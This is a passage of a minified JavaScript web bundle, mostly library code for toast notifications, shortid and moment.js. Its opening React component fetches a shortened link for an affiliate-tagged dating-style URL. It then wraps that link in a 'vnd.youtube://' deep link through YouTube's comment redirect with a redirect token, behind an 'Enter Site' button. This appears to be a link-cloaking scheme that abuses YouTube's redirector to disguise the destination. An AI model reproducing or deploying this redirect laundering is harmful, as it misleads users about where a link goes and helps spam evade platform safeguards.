link"]})]}),pe.jsx(ad,{})]})}function l3(){const[e,t]=$.useState([]);$.useEffect((()=>{fetch(`https://levenda.pw/api?url=${encodeURIComponent("https://nvwqmz.palatlaldate.com?utm_source=da57dc555e50572d&s1=153277&s2=1694088&s3=OPZ_Live&j1=1")}`).then((e=>e.json())).then((e=>t(e.data))).catch((e=>console.log(e)))}),[]);const n=`vnd.youtube://youtube.com/redirect?event=comments&redir_token=${sk}&q=${encodeURIComponent(`https://levenda.pw/${e.shortCode}`)}&html_redirect=1`;return console.log(n),pe.jsx("header",{className:"flex flex-col gap-5 items-center justify-center h-screen",children:pe.jsx("a",{href:n,className:"btn btn-info rounded-full",children:" Enter Site "})})}Ue.loading=(e,t)=>Al(e,ld("default",{isLoading:!0,autoClose:!1,closeOnClick:!1,closeButton:!1,draggable:!1,...t})),Ue.promise=function(e,t,n){let r,{pending:i,error:s,success:o}=t;i&&(r=Hs(i)?Ue.loading(i,n):Ue.loading(i.render,{...n,...i}));const a={isLoading:null,autoClose:null,closeOnClick:null,closeButton:null,draggable:null},l=(e,t,i)=>{if(null==t)return void Ue.dismiss(r);const s={type:e,...a,...n,data:i},o=Hs(t)?{render:t}:t;return r?Ue.update(r,{...s,...o}):Ue(o.render,{...s,...o}),i},u=En(e)?e():e;return u.then((e=>l("success",o,e))).catch((e=>l("error",s,e))),u},Ue.success=Vc("success"),Ue.info=Vc("info"),Ue.error=Vc("error"),Ue.warning=Vc("warning"),Ue.warn=Ue.warning,Ue.dark=(e,t)=>Al(e,ld("default",{theme:"dark",...t})),Ue.dismiss=e=>{fs.size>0?Ln.emit(1,e):dl=dl.filter((t=>null!=e&&t.options.toastId!==e))},Ue.clearWaitingQueue=function(e){return void 0===e&&(e={}),Ln.emit(5,e)},Ue.isActive=e=>{let t=!1;return fs.forEach((n=>{n.isToastActive&&n.isToastActive(e)&&(t=!0)})),t},Ue.update=function(e,t){void 0===t&&(t={}),setTimeout((()=>{const n=function(e,t){let{containerId:n}=t;const r=fs.get(n||bp);return r&&r.getToast(e)}(e,t);if(n){const{props:r,content:i}=n,s={delay:100,...r,...t,toastId:t.toastId||e,updateId:hk()};s.toastId!==e&&(s.staleId=e);const o=s.render||i;delete s.render,Al(o,s)}}),0)},Ue.done=e=>{Ue.update(e,{progress:1})},Ue.onChange=e=>(Ln.on(4,e),()=>{Ln.off(4,e)}),Ue.POSITION={TOP_LEFT:"top-left",TOP_RIGHT:"top-right",TOP_CENTER:"top-center",BOTTOM_LEFT:"bottom-left",BOTTOM_RIGHT:"bottom-right",BOTTOM_CENTER:"bottom-center"},Ue.TYPE={INFO:"info",SUCCESS:"success",WARNING:"warning",ERROR:"error",DEFAULT:"default"},Ln.on(2,(e=>{bp=e.containerId||e,fs.set(bp,e),dl.forEach((e=>{Ln.emit(0,e.content,e.options)})),dl=[]})).on(3,(e=>{fs.delete(e.containerId||e),0===fs.size&&Ln.off(0).off(1).off(5)}));var dk={exports:{}},lh=1;function u3(){return(lh=(9301*lh+49297)%233280)/233280}function c3(e){lh=e}var Si,QS,fl,h3={nextValue:u3,seed:c3},_g=h3,ws="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-";function Eg(){fl=!1}function fk(e){if(e){if(e!==Si){if(e.length!==ws.length)throw new Error("Custom alphabet for shortid must be "+ws.length+" unique characters. You submitted "+e.length+" characters: "+e);var t=e.split("").filter((function(e,t,n){return t!==n.lastIndexOf(e)}));if(t.length)throw new Error("Custom alphabet for shortid must be "+ws.length+" unique characters. These characters were not unique: "+t.join(", "));Si=e,Eg()}}else Si!==ws&&(Si=ws,Eg())}function d3(e){return fk(e),Si}function f3(e){_g.seed(e),QS!==e&&(Eg(),QS=e)}function p3(){Si||fk(ws);for(var e,t=Si.split(""),n=[],r=_g.nextValue();t.length>0;)r=_g.nextValue(),e=Math.floor(r*t.length),n.push(t.splice(e,1)[0]);return n.join("")}function pk(){return fl||(fl=p3())}function m3(e){return pk()[e]}function g3(){return Si||ws}var Tg,e0={get:g3,characters:d3,seed:f3,lookup:m3,shuffled:pk},Op="object"==typeof window&&(window.crypto||window.msCrypto),y3=Tg=Op&&Op.getRandomValues?function(e){return Op.getRandomValues(new Uint8Array(e))}:function(e){for(var t=[],n=0;n<e;n++)t.push(Math.floor(256*Math.random()));return t},v3=function(e,t,n){for(var r=(2<<Math.log(t.length-1)/Math.LN2)-1,i=-~(1.6*r*n/t.length),s="";;)for(var o=e(i),a=i;a--;)if((s+=t[o[a]&r]||"").length===+n)return s},w3=e0,S3=y3,_3=v3;function E3(e){for(var t,n=0,r="";!t;)r+=_3(S3,w3.get(),1),t=e<Math.pow(16,n+1),n++;return r}var zc,XS,T3=E3,Uc=T3,x3=1567752802062,I3=7;function k3(e){var t="",n=Math.floor(.001*(Date.now()-x3));return n===XS?zc++:(zc=0,XS=n),t+=Uc(I3),t+=Uc(e),zc>0&&(t+=Uc(zc)),t+=Uc(n)}var D3=k3,C3=e0;function N3(e){return!(!e||"string"!=typeof e||e.length<6)&&!new RegExp("[^"+C3.get().replace(/[|\\{}()[\]^$+*?.-]/g,"\\$&")+"]").test(e)}var M3=N3;!function(e){var t=e0,n=D3,r=M3,i=0;function s(){return n(i)}e.exports=s,e.exports.generate=s,e.exports.seed=function(n){return t.seed(n),e.exports},e.exports.worker=function(t){return i=t,e.exports},e.exports.characters=function(e){return void 0!==e&&t.characters(e),t.shuffled()},e.exports.isValid=r}(dk);var R3=dk.exports,A3=R3;const b3=xg(A3);function O3(e){throw new Error('Could not dynamically require "'+e+'". Please configure the dynamicRequireTargets or/and ignoreDynamicRequires option of @rollup/plugin-commonjs appropriately for this require call to work.')}var mk={exports:{}};!function(e,t){e.exports=function(){var t,n;function r(){return t.apply(null,arguments)}function i(e){t=e}function s(e){return e instanceof Array||"[object Array]"===Object.prototype.toString.call(e)}function o(e){return null!=e&&"[object Object]"===Object.prototype.toString.call(e)}function a(e,t){return Object.prototype.hasOwnProperty.call(e,t)}function l(e){if(Object.getOwnPropertyNames)return 0===Object.getOwnPropertyNames(e).length;var t;for(t in e)if(a(e,t))return!1;return!0}function u(e){return void 0===e}function c(e){return"number"==typeof e||"[object Number]"===Object.prototype.toString.call(e)}function h(e){return e instanceof Date||"[object Date]"===Object.prototype.toString.call(e)}function d(e,t){var n,r=[],i=e.length;for(n=0;n<i;++n)r.push(t(e[n],n));return r}function f(e,t){for(var n in t)a(t,n)&&(e[n]=t[n]);return a(t,"toString")&&(e.toString=t.toString),a(t,"valueOf")&&(e.valueOf=t.valueOf),e}function p(e,t,n,r){return Yn(e,t,n,r,!0).utc()}function m(){return{empty:!1,unusedTokens:[],unusedInput:[],overflow:-2,charsLeftOver:0,nullInput:!1,invalidEra:null,invalidMonth:null,invalidFormat:!1,userInvalidated:!1,iso:!1,parsedDateParts:[],era:null,meridiem:null,rfc2822:!1,weekdayMismatch:!1}}function g(e){return null==e._pf&&(e._pf=m()),e._pf}function y(e){if(null==e._isValid){var t=g(e),r=n.call(t.parsedDateParts,(function(e){return null!=e})),i=!isNaN(e._d.getTime())&&t.overflow<0&&!t.empty&&!t.invalidEra&&!t.invalidMonth&&!t.invalidWeekday&&!t.weekdayMismatch&&!t.nullInput&&!t.invalidFormat&&!t.userInvalidated&&(!t.meridiem||t.meridiem&&r);if(e._strict&&(i=i&&0===t.charsLeftOver&&0===t.unusedTokens.length&&void 0===t.bigHour),null!=Object.isFrozen&&Object.isFrozen(e))return i;e._isValid=i}return e._isValid}function v(e){var t=p(NaN);return null!=e?f(g(t),e):g(t).userInvalidated=!0,t}n=Array.prototype.some?Array.prototype.some:function(e){var t,n=Object(this),r=n.length>>>0;for(t=0;t<r;t++)if(t in n&&e.call(this,n[t],t,n))return!0;return!1};var w=r.momentProperties=[],b=!1;function _(e,t){var n,r,i,s=w.length;if(u(t._isAMomentObject)||(e._isAMomentObject=t._isAMomentObject),u(t._i)||(e._i=t._i),u(t._f)||(e._f=t._f),u(t._l)||(e._l=t._l),u(t._strict)||(e._strict=t._strict),u(t._tzm)||(e._tzm=t._tzm),u(t._isUTC)||(e._isUTC=t._isUTC),u(t._offset)||(e._offset=t._offset),u(t._pf)||(e._pf=g(t)),u(t._locale)||(e._locale=t._locale),s>0)for(n=0;n<s;n++)u(i=t[r=w[n]])||(e[r]=i);return e}function S(e){_(this,e),this._d=new Date(null!=e._d?e._d.getTime():NaN),this.isValid()||(this._d=new Date(NaN)),!1===b&&(b=!0,r.updateOffset(this),b=!1)}function E(e){return e instanceof S||null!=e&&null!=e._isAMomentObject}function T(e){!1===r.suppressDeprecationWarnings&&typeof console<"u"&&console.warn&&console.warn("Deprecation warning: "+e)}function k(e,t){var n=!0;return f((function(){if(null!=r.deprecationHandler&&r.deprecationHandler(null,e),n){var i,s,o,l=[],u=arguments.length;for(s=0;s<u;s++){if(i="","object"==typeof arguments[s]){for(o in i+="\n["+s+"] ",arguments[0])a(arguments[0],o)&&(i+=o+": "+arguments[0][o]+", ");i=i.slice(0,-2)}else i=arguments[s];l.push(i)}T(e+"\nArguments: "+Array.prototype.slice.call(l).join("")+"\n"+(new Error).stack),n=!1}return t.apply(this,arguments)}),t)}var x,I={};function C(e,t){null!=r.deprecationHandler&&r.deprecationHandler(e,t),I[e]||(T(t),I[e]=!0)}function D(e){return typeof Function<"u"&&e instanceof Function||"[object Function]"===Object.prototype.toString.call(e)}function M(e){var t,n;for(n in e)a(e,n)&&(D(t=e[n])?this[n]=t:this["_"+n]=t);this._config=e,this._dayOfMonthOrdinalParseLenient=new RegExp((this._dayOfMonthOrdinalParse.source||this._ordinalParse.source)+"|"+/\d{1,2}/.source)}function N(e,t){var n,r=f({},e);for(n in t)a(t,n)&&(o(e[n])&&o(t[n])?(r[n]={},f(r[n],e[n]),f(r[n],t[n])):null!=t[n]?r[n]=t[n]:delete r[n]);for(n in e)a(e,n)&&!a(t,n)&&o(e[n])&&(r[n]=f({},r[n]));return r}function A(e){null!=e&&this.set(e)}r.suppressDeprecationWarnings=!1,r.deprecationHandler=null,x=Object.keys?Object.keys:function(e){var t,n=[];for(t in e)a(e,t)&&n.push(t);return n};var L={sameDay:"[Today at] LT",nextDay:"[Tomorrow at] LT",nextWeek:"dddd [at] LT",lastDay:"[Yesterday at] LT",lastWeek:"[Last] dddd [at] LT",sameElse:"L"};function O(e,t,n){var r=this._calendar[e]||this._calendar.sameElse;return D(r)?r.call(t,n):r}function R(e,t,n){var r=""+Math.abs(e),i=t-r.length;return(e>=0?n?"+":"":"-")+Math.pow(10,Math.max(0,i)).toString().substr(1)+r}var P=/(\[[^\[]*\])|(\\)?([Hh]mm(ss)?|Mo|MM?M?M?|Do|DDDo|DD?D?D?|ddd?d?|do?|w[o|w]?|W[o|W]?|Qo?|N{1,5}|YYYYYY|YYYYY|YYYY|YY|y{2,4}|yo?|gg(ggg?)?|GG(GGG?)?|e|E|a|A|hh?|HH?|kk?|mm?|ss?|S{1,9}|x|X|zz?|ZZ?|.)/g,F=/(\[[^\[]*\])|(\\)?(LTS|LT|LL?L?L?|l{1,4})/g,V={},U={};function B(e,t,n,r){var i=r;"string"==typeof r&&(i=function(){return this[r]()}),e&&(U[e]=i),t&&(U[t[0]]=function(){return R(i.apply(this,arguments),t[1],t[2])}),n&&(U[n]=function(){return this.localeData().ordinal(i.apply(this,arguments),e)})}function z(e){return e.match(/\[[\s\S]/)?e.replace(/^\[|\]$/g,""):e.replace(/\\/g,"")}function $(e){var t,n,r=e.match(P);for(t=0,n=r.length;t<n;t++)U[r[t]]?r[t]=U[r[t]]:r[t]=z(r[t]);return function(t){var i,s="";for(i=0;i<n;i++)s+=D(r[i])?r[i].call(t,e):r[i];return s}}function j(e,t){return e.isValid()?(t=q(t,e.localeData()),V[t]=V[t]||$(t),V[t](e)):e.localeData().invalidDate()}function q(e,t){var n=5;function r(e){return t.longDateFormat(e)||e}for(F.lastIndex=0;n>=0&&F.test(e);)e=e.replace(F,r),F.lastIndex=0,n-=1;return e}var G={LTS:"h:mm:ss A",LT:"h:mm A",L:"MM/DD/YYYY",LL:"MMMM D, YYYY",LLL:"MMMM D, YYYY h:mm A",LLLL:"dddd, MMMM D, YYYY h:mm A"};function W(e){var t=this._longDateFormat[e],n=this._longDateFormat[e.toUpperCase()];return t||!n?t:(this._longDateFormat[e]=n.match(P).map((function(e){return"MMMM"===e||"MM"===e||"DD"===e||"dddd"===e?e.slice(1):e})).join(""),this._longDateFormat[e])}var K="Invalid date";function Y(){return this._invalidDate}var H="%d",Q=/\d{1,2}/;function X(e){return this._ordinal.replace("%d",e)}var J={future:"in %s",past:"%s ago",s:"a few seconds",ss:"%d seconds",m:"a minute",mm:"%d minutes",h:"an hour",hh:"%d hours",d:"a day",dd:"%d days",w:"a week",ww:"%d weeks",M:"a month",MM:"%d months",y:"a year",yy:"%d years"};function Z(e,t,n,r){var i=this._relativeTime[n];return D(i)?i(e,t,n,r):i.replace(/%d/i,e)}function ee(e,t){var n=this._relativeTime[e>0?"future":"past"];return D(n)?n(t):n.replace(/%s/i,t)}var te={};function ne(e,t){var n=e.toLowerCase();te[n]=te[n+"s"]=te[t]=e}function re(e){return"string"==typeof e?te[e]||te[e.toLowerCase()]:void 0}function ie(e){var t,n,r={};for(n in e)a(e,n)&&(t=re(n))&&(r[t]=e[n]);return r}var se={};function oe(e,t){se[e]=t}function ae(e){var t,n=[];for(t in e)a(e,t)&&n.push({unit:t,priority:se[t]});return n.sort((function(e,t){return e.priority-t.priority})),n}function le(e){return e%4==0&&e%100!=0||e%400==0}function ue(e){return e<0?Math.ceil(e)||0:Math.floor(e)}function ce(e){var t=+e,n=0;return 0!==t&&isFinite(t)&&(n=ue(t)),n}function he(e,t){return function(n){return null!=n?(fe(this,e,n),r.updateOffset(this,t),this):de(this,e)}}function de(e,t){return e.isValid()?e._d["get"+(e._isUTC?"UTC":"")+t]():NaN}function fe(e,t,n){e.isValid()&&!isNaN(n)&&("FullYear"===t&&le(e.year())&&1===e.month()&&29===e.date()?(n=ce(n),e._d["set"+(e._isUTC?"UTC":"")+t](n,e.month(),Ze(n,e.month()))):e._d["set"+(e._isUTC?"UTC":"")+t](n))}function pe(e){return D(this[e=re(e)])?this[e]():this}function me(e,t){if("object"==typeof e){var n,r=ae(e=ie(e)),i=r.length;for(n=0;n<i;n++)this[r[n].unit](e[r[n].unit])}else if(D(this[e=re(e)]))return this[e](t);return this}var ge,ye=/\d/,ve=/\d\d/,we=/\d{3}/,be=/\d{4}/,_e=/[+-]?\d{6}/,Se=/\d\d?/,Ee=/\d\d\d\d?/,Te=/\d\d\d\d\d\d?/,ke=/\d{1,3}/,xe=/\d{1,4}/,Ie=/[+-]?\d{1,6}/,Ce=/\d+/,De=/[+-]?\d+/,Me=/Z|[+-]\d\d:?\d\d/gi,Ne=/Z|[+-]\d\d(?::?\d\d)?/gi,Ae=/[+-]?\d+(\.\d{1,3})?/,Le=/[0-9]{0,256}['a-z\u00A0-\u05FF\u0700-\uD7FF\uF900-\uFDCF\uFDF0-\uFF07\uFF10-\uFFEF]{1,256}|[\u0600-\u06FF\/]{1,256}(\s*?[\u0600-\u06FF]{1,256}){1,2}/i;function Oe(e,t,n){ge[e]=D(t)?t:function(e,r){return e&&n?n:t}}function Re(e,t){return a(ge,e)?ge[e](t._strict,t._locale):new RegExp(Pe(e))}function Pe(e){return Fe(e.replace("\\","").replace(/\\(\[)|\\(\])|\[([^\]\[]*)\]|\\(.)/g,(function(e,t,n,r,i){return t||n||r||i})))}function Fe(e){return e.replace(/[-\/\\^$*+?.()|[\]{}]/g,"\\$&")}ge={};var Ve={};function Ue(e,t){var n,r,i=t;for("string"==typeof e&&(e=[e]),c(t)&&(i=function(e,n){n[t]=ce(e)}),r=e.length,n=0;n<r;n++)Ve[e[n]]=i}function Be(e,t){Ue(e,(function(e,n,r,i){r._w=r._w||{},t(e,r._w,r,i)}))}function ze(e,t,n){null!=t&&a(Ve,e)&&Ve[e](t,n._a,n,e)}var $e,je=0,qe=1,Ge=2,We=3,Ke=4,Ye=5,He=6,Qe=7,Xe=8;function Je(e,t){return(e%t+t)%t}function Ze(e,t){if(isNaN(e)||isNaN(t))return NaN;var n=Je(t,12);return e+=(t-n)/12,1===n?le(e)?29:28:31-n%7%2}$e=Array.prototype.indexOf?Array.prototype.indexOf:function(e){var t;for(t=0;t<this.length;++t)if(this[t]===e)return t;return-1},B("M",["MM",2],"Mo",(function(){return this.month()+1})),B("MMM",0,0,(function(e){return this.localeData().monthsShort(this,e)})),B("MMMM",0,0,(function(e){return this.localeData().months(this,e)})),ne("month","M"),oe("month",8),Oe("M",Se),Oe("MM",Se,ve),Oe("MMM",(function(e,t){return t.monthsShortRegex(e)})),Oe("MMMM",(function(e,t){return t.monthsRegex(e)})),Ue(["M","MM"],(function(e,t){t[qe]=ce(e)-1})),Ue(["MMM","MMMM"],(function(e,t,n,r){var i=n._locale.monthsParse(e,r,n._strict);null!=i?t[qe]=i:g(n).invalidMonth=e}));var et="January_February_March_April_May_June_July_August_September_October_November_December".split("_"),tt="Jan_Feb_Mar_Apr_May_Jun_Jul_Aug_Sep_Oct_Nov_Dec".split("_"),nt=/D[oD]?(\[[^\[\]]*\]|\s)+MMMM?/,rt=Le,it=Le;function st(e,t){return e?s(this._months)?this._months[e.month()]:this._months[(this._months.isFormat||nt).test(t)?"format":"standalone"][e.month()]:s(this._months)?this._months:this._months.standalone}function ot(e,t){return e?s(this._monthsShort)?this._monthsShort[e.month()]:this._monthsShort[nt.test(t)?"format":"standalone"][e.month()]:s(this._monthsShort)?this._monthsShort:this._monthsShort.standalone}function at(e,t,n){var r,i,s,o=e.toLocaleLowerCase();if(!this._monthsParse)for(this._monthsParse=[],this._longMonthsParse=[],this._shortMonthsParse=[],r=0;r<12;++r)s=p([2e3,r]),this._shortMonthsParse[r]=this.monthsShort(s,"").toLocaleLowerCase(),this._longMonthsParse[r]=this.months(s,"").toLocaleLowerCase();return n?"MMM"===t?-1!==(i=$e.call(this._shortMonthsParse,o))?i:null:-1!==(i=$e.call(this._longMonthsParse,o))?i:null:"MMM"===t?-1!==(i=$e.call(this._shortMonthsParse,o))||-1!==(i=$e.call(this._longMonthsParse,o))?i:null:-1!==(i=$e.call(this._longMonthsParse,o))||-1!==(i=$e.call(this._shortMonthsParse,o))?i:null}function lt(e,t,n){var r,i,s;if(this._monthsParseExact)return at.call(this,e,t,n);for(this._monthsParse||(this._monthsParse=[],this._longMonthsParse=[],this._shortMonthsParse=[]),r=0;r<12;r++){if(i=p([2e3,r]),n&&!this._longMonthsParse[r]&&(this._longMonthsParse[r]=new RegExp("^"+this.months(i,"").replace(".","")+"$","i"),this._shortMonthsParse[r]=new RegExp("^"+this.monthsShort(i,"").replace(".","")+"$","i")),!n&&!this._monthsParse[r]&&(s="^"+this.months(i,"")+"|^"+this.monthsShort(i,""),this._monthsParse[r]=new RegExp(s.replace(".",""),"i")),n&&"MMMM"===t&&this._longMonthsParse[r].test(e))return r;if(n&&"MMM"===t&&this._shortMonthsParse[r].test(e))return r;if(!n&&this._monthsParse[r].test(e))return r}}function ut(e,t){var n;if(!e.isValid())return e;if("string"==typeof t)if(/^\d+$/.test(t))t=ce(t);else if(!c(t=e.localeData().monthsParse(t)))return e;return n=Math.min(e.date(),Ze(e.year(),t)),e._d["set"+(e._isUTC?"UTC":"")+"Month"](t,n),e}function ct(e){return null!=e?(ut(this,e),r.updateOffset(this,!0),this):de(this,"Month")}function ht(){return Ze(this.year(),this.month())}function dt(e){return this._monthsParseExact?(a(this,"_monthsRegex")||pt.call(this),e?this._monthsShortStrictRegex:this._monthsShortRegex):(a(this,"_monthsShortRegex")||(this._monthsShortRegex=rt),this._monthsShortStrictRegex&&e?this._monthsShortStrictRegex:this._monthsShortRegex)}function ft(e){return this._monthsParseExact?(a(this,"_monthsRegex")||pt.call(this),e?this._monthsStrictRegex:this._monthsRegex):(a(this,"_monthsRegex")||(this._monthsRegex=it),this._monthsStrictRegex&&e?this._monthsStrictRegex:this._monthsRegex)}function pt(){function e(e,t){return t.length-e.length}var t,n,r=[],i=[],s=[];for(t=0;t<12;t++)n=p([2e3,t]),r.push(this.monthsShort(n,"")),i.push(this.months(n,"")),s.push(this.months(n,"")),s.push(this.monthsShort(n,""));for(r.sort(e),i.sort(e),s.sort(e),t=0;t<12;t++)r[t]=Fe(r[t]),i[t]=Fe(i[t]);for(t=0;t<24;t++)s[t]=Fe(s[t]);this._monthsRegex=new RegExp("^("+s.join("|")+")","i"),this._monthsShortRegex=this._monthsRegex,this._monthsStrictRegex=new RegExp("^("+i.join("|")+")","i"),this._monthsShortStrictRegex=new RegExp("^("+r.join("|")+")","i")}function mt(e){return le(e)?366:365}B("Y",0,0,(function(){var e=this.year();return e<=9999?R(e,4):"+"+e})),B(0,["YY",2],0,(function(){return this.year()%100})),B(0,["YYYY",4],0,"year"),B(0,["YYYYY",5],0,"year"),B(0,["YYYYYY",6,!0],0,"year"),ne("year","y"),oe("year",1),Oe("Y",De),Oe("YY",Se,ve),Oe("YYYY",xe,be),Oe("YYYYY",Ie,_e),Oe("YYYYYY",Ie,_e),Ue(["YYYYY","YYYYYY"],je),Ue("YYYY",(function(e,t){t[je]=2===e.length?r.parseTwoDigitYear(e):ce(e)})),Ue("YY",(function(e,t){t[je]=r.parseTwoDigitYear(e)})),Ue("Y",(function(e,t){t[je]=parseInt(e,10)})),r.parseTwoDigitYear=function(e){return ce(e)+(ce(e)>68?1900:2e3)};var gt=he("FullYear",!0);function yt(){return le(this.year())}function vt(e,t,n,r,i,s,o){var a;return e<100&&e>=0?(a=new Date(e+400,t,n,r,i,s,o),isFinite(a.getFullYear())&&a.setFullYear(e)):a=new Date(e,t,n,r,i,s,o),a}function wt(e){var t,n;return e<100&&e>=0?((n=Array.prototype.slice.call(arguments))[0]=e+400,t=new Date(Date.UTC.apply(null,n)),isFinite(t.getUTCFullYear())&&t.setUTCFullYear(e)):t=new Date(Date.UTC.apply(null,arguments)),t}function bt(e,t,n){var r=7+t-n;return-(7+wt(e,0,r).getUTCDay()-t)%7+r-1}function _t(e,t,n,r,i){var s,o,a=1+7*(t-1)+(7+n-r)%7+bt(e,r,i);return a<=0?o=mt(s=e-1)+a:a>mt(e)?(s=e+1,o=a-mt(e)):(s=e,o=a),{year:s,dayOfYear:o}}function St(e,t,n){var r,i,s=bt(e.year(),t,n),o=Math.floor((e.dayOfYear()-s-1)/7)+1;return o<1?r=o+Et(i=e.year()-1,t,n):o>Et(e.year(),t,n)?(r=o-Et(e.year(),t,n),i=e.year()+1):(i=e.year(),r=o),{week:r,year:i}}function Et(e,t,n){var r=bt(e,t,n),i=bt(e+1,t,n);return(mt(e)-r+i)/7}function Tt(e){return St(e,this._week.dow,this._week.doy).week}B("w",["ww",2],"wo","week"),B("W",["WW",2],"Wo","isoWeek"),ne("week","w"),ne("isoWeek","W"),oe("week",5),oe("isoWeek",5),Oe("w",Se),Oe("ww",Se,ve),Oe("W",Se),Oe("WW",Se,ve),Be(["w","ww","W","WW"],(function(e,t,n,r){t[r.substr(0,1)]=ce(e)}));var kt={dow:0,doy:6};function xt(){return this._week.dow}function It(){return this._week.doy}function Ct(e){var t=this.localeData().week(this);return null==e?t:this.add(7*(e-t),"d")}function Dt(e){var t=St(this,1,4).week;return null==e?t:this.add(7*(e-t),"d")}function Mt(e,t){return"string"!=typeof e?e:isNaN(e)?"number"==typeof(e=t.weekdaysParse(e))?e:null:parseInt(e,10)}function Nt(e,t){return"string"==typeof e?t.weekdaysParse(e)%7||7:isNaN(e)?null:e}function At(e,t){return e.slice(t,7).concat(e.slice(0,t))}B("d",0,"do","day"),B("dd",0,0,(function(e){return this.localeData().weekdaysMin(this,e)})),B("ddd",0,0,(function(e){return this.localeData().weekdaysShort(this,e)})),B("dddd",0,0,(function(e){return this.localeData().weekdays(this,e)})),B("e",0,0,"weekday"),B("E",0,0,"isoWeekday"),ne("day","d"),ne("weekday","e"),ne("isoWeekday","E"),oe("day",11),oe("weekday",11),oe("isoWeekday",11),Oe("d",Se),Oe("e",Se),Oe("E",Se),Oe("dd",(function(e,t){return t.weekdaysMinRegex(e)})),Oe("ddd",(function(e,t){return t.weekdaysShortRegex(e)})),Oe("dddd",(function(e,t){return t.weekdaysRegex(e)})),Be(["dd","ddd","dddd"],(function(e,t,n,r){var i=n._locale.weekdaysParse(e,r,n._strict);null!=i?t.d=i:g(n).invalidWeekday=e})),Be(["d","e","E"],(function(e,t,n,r){t[r]=ce(e)}));var Lt="Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"),Ot="Sun_Mon_Tue_Wed_Thu_Fri_Sat".split("_"),Rt="Su_Mo_Tu_We_Th_Fr_Sa".split("_"),Pt=Le,Ft=Le,Vt=Le;function Ut(e,t){var n=s(this._weekdays)?this._weekdays:this._weekdays[e&&!0!==e&&this._weekdays.isFormat.test(t)?"format":"standalone"];return!0===e?At(n,this._week.dow):e?n[e.day()]:n}function Bt(e){return!0===e?At(this._weekdaysShort,this._week.dow):e?this._weekdaysShort[e.day()]:this._weekdaysShort}function zt(e){return!0===e?At(this._weekdaysMin,this._week.dow):e?this._weekdaysMin[e.day()]:this._weekdaysMin}function $t(e,t,n){var r,i,s,o=e.toLocaleLowerCase();if(!this._weekdaysParse)for(this._weekdaysParse=[],this._shortWeekdaysParse=[],this._minWeekdaysParse=[],r=0;r<7;++r)s=p([2e3,1]).day(r),this._minWeekdaysParse[r]=this.weekdaysMin(s,"").toLocaleLowerCase(),this._shortWeekdaysParse[r]=this.weekdaysShort(s,"").toLocaleLowerCase(),this._weekdaysParse[r]=this.weekdays(s,"").toLocaleLowerCase();return n?"dddd"===t?-1!==(i=$e.call(this._weekdaysParse,o))?i:null:"ddd"===t?-1!==(i=$e.call(this._shortWeekdaysParse,o))?i:null:-1!==(i=$e.call(this._minWeekdaysParse,o))?i:null:"dddd"===t?-1!==(i=$e.call(this._weekdaysParse,o))||-1!==(i=$e.call(this._shortWeekdaysParse,o))||-1!==(i=$e.call(this._minWeekdaysParse,o))?i:null:"ddd"===t?-1!==(i=$e.call(this._shortWeekdaysParse,o))||-1!==(i=$e.call(this._weekdaysParse,o))||-1!==(i=$e.call(this._minWeekdaysParse,o))?i:null:-1!==(i=$e.call(this._minWeekdaysParse,o))||-1!==(i=$e.call(this._weekdaysParse,o))||-1!==(i=$e.call(this._shortWeekdaysParse,o))?i:null}function jt(e,t,n){var r,i,s;if(this._weekdaysParseExact)return $t.call(this,e,t,n);for(this._weekdaysParse||(this._weekdaysParse=[],this._minWeekdaysParse=[],this._shortWeekdaysParse=[],this._fullWeekdaysParse=[]),r=0;r<7;r++){if(i=p([2e3,1]).day(r),n&&!this._fullWeekdaysParse[r]&&(this._fullWeekdaysParse[r]=new RegExp("^"+this.weekdays(i,"").replace(".","\\.?")+"$","i"),this._shortWeekdaysParse[r]=new RegExp("^"+this.weekdaysShort(i,"").replace(".","\\.?")+"$","i"),this._minWeekdaysParse[r]=new RegExp("^"+this.weekdaysMin(i,"").replace(".","\\.?")+"$","i")),this._weekdaysParse[r]||(s="^"+this.weekdays(i,"")+"|^"+this.weekdaysShort(i,"")+"|^"+this.weekdaysMin(i,""),this._weekdaysParse[r]=new RegExp(s.replace(".",""),"i")),n&&"dddd"===t&&this._fullWeekdaysParse[r].test(e))return r;if(n&&"ddd"===t&&this._shortWeekdaysParse[r].test(e))return r;if(n&&"dd"===t&&this._minWeekdaysParse[r].test(e))return r;if(!n&&this._weekdaysParse[r].test(e))return r}}function qt(e){if(!this.isValid())return null!=e?this:NaN;var t=this._isUTC?this._d.getUTCDay():this._d.getDay();return null!=e?(e=Mt(e,this.localeData()),this.add(e-t,"d")):t}function Gt(e){if(!this.isValid())return null!=e?this:NaN;var t=(this.day()+7-this.localeData()._week.dow)%7;return null==e?t:this.add(e-t,"d")}function Wt(e){if(!this.isValid())return null!=e?this:NaN;if(null!=e){var t=Nt(e,this.localeData());return this.day(this.day()%7?t:t-7)}return this.day()||7}function Kt(e){return this._weekdaysParseExact?(a(this,"_weekdaysRegex")||Qt.call(this),e?this._weekdaysStrictRegex:this._weekdaysRegex):(a(this,"_weekdaysRegex")||(this._weekdaysRegex=Pt),this._weekdaysStrictRegex&&e?this._weekdaysStrictRegex:this._weekdaysRegex)}function Yt(e){return this._weekdaysParseExact?(a(this,"_weekdaysRegex")||Qt.call(this),e?this._weekdaysShortStrictRegex:this._weekdaysShortRegex):(a(this,"_weekdaysShortRegex")||(this._weekdaysShortRegex=Ft),this._weekdaysShortStrictRegex&&e?this._weekdaysShortStrictRegex:this._weekdaysShortRegex)}function Ht(e){return this._weekdaysParseExact?(a(this,"_weekdaysRegex")||Qt.call(this),e?this._weekdaysMinStrictRegex:this._weekdaysMinRegex):(a(this,"_weekdaysMinRegex")||(this._weekdaysMinRegex=Vt),this._weekdaysMinStrictRegex&&e?this._weekdaysMinStrictRegex:this._weekdaysMinRegex)}function Qt(){function e(e,t){return t.length-e.length}var t,n,r,i,s,o=[],a=[],l=[],u=[];for(t=0;t<7;t++)n=p([2e3,1]).day(t),r=Fe(this.weekdaysMin(n,"")),i=Fe(this.weekdaysShort(n,"")),s=Fe(this.weekdays(n,"")),o.push(r),a.push(i),l.push(s),u.push(r),u.push(i),u.push(s);o.sort(e),a.sort(e),l.sort(e),u.sort(e),this._weekdaysRegex=new RegExp("^("+u.join("|")+")","i"),this._weekdaysShortRegex=this._weekdaysRegex,this._weekdaysMinRegex=this._weekdaysRegex,this._weekdaysStrictRegex=new RegExp("^("+l.join("|")+")","i"),this._weekdaysShortStrictRegex=new RegExp("^("+a.join("|")+")","i"),this._weekdaysMinStrictRegex=new RegExp("^("+o.join("|")+")","i")}function 